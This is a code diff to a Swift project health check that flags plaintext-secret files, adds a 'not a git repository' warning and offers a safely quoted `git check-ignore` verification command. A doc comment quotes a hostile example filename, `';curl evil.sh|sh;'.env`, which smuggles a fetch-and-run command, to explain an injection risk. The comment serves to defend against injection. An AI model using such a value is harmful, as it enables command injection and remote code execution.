@@ -723,37 +723,51 @@ public struct ProjectHealthCheck: HealthCheck {
     /// 2. **The oracle.** Ignore status is decided by `git check-ignore`, not
     ///    by comparing `.gitignore` lines to filenames. See `GitIgnoreOracle`.
     ///
-    /// When git cannot answer — no repository, no git binary — the finding is
-    /// `.unknown` and still names the files it found. Guessing is what
-    /// produced the false OK; a named file with an honest "could not
-    /// determine" is strictly more useful than a confident wrong answer.
+    /// When git genuinely cannot answer — no git binary, an unreadable
+    /// answer — the finding is `.unknown` and still names the files it
+    /// found. Guessing is what produced the false OK; a named file with an
+    /// honest "could not determine" is strictly more useful than a confident
+    /// wrong answer. **"Not inside a git repository" is different** — ticket
+    /// #8, claim 2: that is a definite fact `GitIgnoreOracle` can establish
+    /// (`.noRepository`, its own case, not folded into `.undetermined`), and
+    /// it gets its own `.warning` branch below rather than sharing this
+    /// paragraph's "could not determine" wording.
     ///
-    /// **Why the exposed-files branch offers no command.** It used to offer
-    /// `echo '<name>' >> .gitignore`, built by wrapping the filename in a pair
-    /// of single quotes. That was safe only while the candidate list was three
-    /// hardcoded literals; the tree walk above made it "any filename in any
-    /// repository the user cloned", and a file named `';curl evil.sh|sh;'.env`
-    /// turns that string into three commands. `ShellQuoting` fixes the shell
-    /// layer — but a `.gitignore` line needs a *second*, different escaping
-    /// layer on top of it, because gitignore reads `*`, `?`, `[`, `]`, `!`,
-    /// `#` and `\` as syntax, strips trailing spaces, and anchors any pattern
-    /// containing a slash. A generated one-liner correct in both layers at
-    /// once is unreadable, and an unreadable command is an unauditable one —
-    /// which is the whole reason PROPOSAL.md §6 hands the user a string
-    /// instead of running it. Worse, a line that is shell-correct and
-    /// gitignore-wrong *appears* to work while ignoring nothing, which is this
-    /// branch's own failure mode all over again.
+    /// **Why the exposed-files branch does not generate a `.gitignore`
+    /// line.** It used to offer `echo '<name>' >> .gitignore`, built by
+    /// wrapping the filename in a pair of single quotes. That was safe only
+    /// while the candidate list was three hardcoded literals; the tree walk
+    /// above made it "any filename in any repository the user cloned", and a
+    /// file named `';curl evil.sh|sh;'.env` turns that string into three
+    /// commands. `ShellQuoting` fixes the shell layer — but a `.gitignore`
+    /// line needs a *second*, different escaping layer on top of it, because
+    /// gitignore reads `*`, `?`, `[`, `]`, `!`, `#` and `\` as syntax, strips
+    /// trailing spaces, and anchors any pattern containing a slash. A
+    /// generated one-liner correct in both layers at once is unreadable, and
+    /// an unreadable command is an unauditable one — which is the whole
+    /// reason PROPOSAL.md §6 hands the user a string instead of running it.
+    /// Worse, a line that is shell-correct and gitignore-wrong *appears* to
+    /// work while ignoring nothing, which is this branch's own failure mode
+    /// all over again.
     ///
-    /// So the exposed-files branch names the files and says what to do with
-    /// them, and warns when a name contains gitignore syntax. PROPOSAL.md §6
-    /// already lists "adding a line to `.gitignore`" among the actions inside
-    /// the app's own domain that it may perform directly; when that ships, it
-    /// replaces this explanation with a button, not with a better one-liner.
+    /// **It does offer a command now, though — ticket #8, claim 4.** Not a
+    /// `.gitignore` line: a `git check-ignore -v --` call over the exposed
+    /// names, the same safely shell-quoted shape the `.undetermined` branch
+    /// already uses (see below). It cannot tell the user *how* to fix a name
+    /// gitignore syntax makes awkward to hand-edit — the escaping problem
+    /// above is unchanged — but it can tell them, safely and precisely,
+    /// whether whatever they typed by hand actually worked. That is the
+    /// "alternative postup" the ticket asked for: a real command, not a
+    /// bigger prose warning. PROPOSAL.md §6 still lists "adding a line to
+    /// `.gitignore`" among the actions inside the app's own domain that it
+    /// may perform directly; when that ships, it replaces the whole
+    /// gitignore-editing explanation with a button, not with a better
+    /// one-liner — the verification command stands on its own regardless.
     ///
-    /// The `.undetermined` branch keeps its command. `git check-ignore` takes
-    /// a path, not a pattern — there is only the shell layer to get right, and
-    /// `ShellQuoting` plus a `--` separator gets it right for every filename
-    /// that can appear on one line.
+    /// The `.undetermined` branch has always had this option available.
+    /// `git check-ignore` takes a path, not a pattern — there is only the
+    /// shell layer to get right, and `ShellQuoting` plus a `--` separator
+    /// gets it right for every filename that can appear on one line.
     ///
     /// **Scope.** This finding is produced from the same single walk
     /// `recipientFinding` uses, and it inherits that walk's limits: the
@@ -806,6 +820,23 @@ public struct ProjectHealthCheck: HealthCheck {
         let names = candidates.map(relativeName).sorted()
 
         switch GitIgnoreOracle.classify(candidates: candidates, root: root, gitPath: gitPath) {
+        case .noRepository:
+            // Ticket #8, claim 2: this used to fall straight into
+            // `.undetermined` alongside every case where git genuinely
+            // couldn't answer — so a project with no git at all could never
+            // reach a verdict here, forever. "Not inside a git repository" is
+            // a definite fact about this project, not a missing answer, and
+            // it changes the honest thing to say: none of these files can be
+            // committed to a repository by accident, because there is no
+            // repository. That is real information, even though the files
+            // themselves are still sitting on disk unencrypted — which is why
+            // this is `.warning`, not `.ok`.
+            return scope.finding(
+                about: .theWholeTree,
+                id: findingID, title: title, status: .warning,
+                detail: "These files under \(project.rootPath) have names that conventionally hold plaintext secrets: \(names.joined(separator: ", ")). This project is not inside a git repository, so none of them can be committed to one by accident from here — but they are still on disk, unencrypted.",
+                remediation: Remediation(explanation: "If this ever becomes a git repository (`git init`), gitignore these files or move their secrets into a file this app encrypts before the first commit."))
+
         case .undetermined(let reason):
             // `--` before the paths: a file called `-v.env` is an option to
             // every CLI ever written, and quoting does not change that.
@@ -865,9 +896,27 @@ public struct ProjectHealthCheck: HealthCheck {
                 ? " If one has already been committed, rotating the values is the only real fix — removing the file from a future commit does not remove it from history."
                 : " For the files already tracked, rotating the values is the only real fix: they are in the history, and neither a .gitignore line nor a future deletion removes them from it. `git rm --cached <file>` stops tracking it going forward."
 
+            // Ticket #8, claim 4: this app still will not generate the
+            // `.gitignore` *line* itself — see this method's doc comment for
+            // why a string correct in both gitignore's pattern syntax and the
+            // shell at once is unreadable, and unreadable is unauditable.
+            // But it does not follow that no command can be offered at all.
+            // `git check-ignore -v --` takes literal paths, not patterns, so
+            // it needs only the shell-quoting layer `ShellQuoting` already
+            // gets right for every filename that fits on one line — the exact
+            // mechanism the `.undetermined` branch above already uses. That
+            // makes it a genuine "alternative procedure" for a name gitignore
+            // syntax makes awkward to hand-edit: add the line by hand, however
+            // it needs escaping, then paste this to confirm the edit actually
+            // took effect rather than silently ignoring nothing.
+            let command = ShellQuoting.singleQuotedList(exposedNames).map { "git check-ignore -v -- " + $0 }
+
             var explanation = "Add these to .gitignore, one line per file — \(exposedNames.joined(separator: ", ")) — then move their secrets into a file this app encrypts."
+            if command != nil {
+                explanation += " Then run the command below to confirm the lines you added actually took effect."
+            }
             if exposedNames.contains(where: Self.nameNeedsGitignoreEscaping) {
-                explanation += " One of those names contains a character .gitignore reads as pattern syntax (*, ?, [, ], !, # or \\), so it has to be escaped with a backslash in the line you add. `git check-ignore -v -- <file>` afterwards tells you whether the line actually took effect."
+                explanation += " One of those names contains a character .gitignore reads as pattern syntax (*, ?, [, ], !, # or \\), so it has to be escaped with a backslash in the line you add — the command below is what tells you whether you got that right."
             }
             if exposedNames.contains(where: Self.nameSpansLines) {
                 explanation += " \(Self.newlineInNameNote)"
@@ -878,10 +927,7 @@ public struct ProjectHealthCheck: HealthCheck {
                 about: .theWholeTree,
                 id: findingID, title: title, status: .problem,
                 detail: detail,
-                // No command. See this method's doc comment: a `.gitignore`
-                // line needs pattern escaping as well as shell escaping, and a
-                // string correct in both is one nobody can read before running.
-                remediation: Remediation(explanation: explanation, command: nil))
+                remediation: Remediation(explanation: explanation, command: command))
         }
     }
 
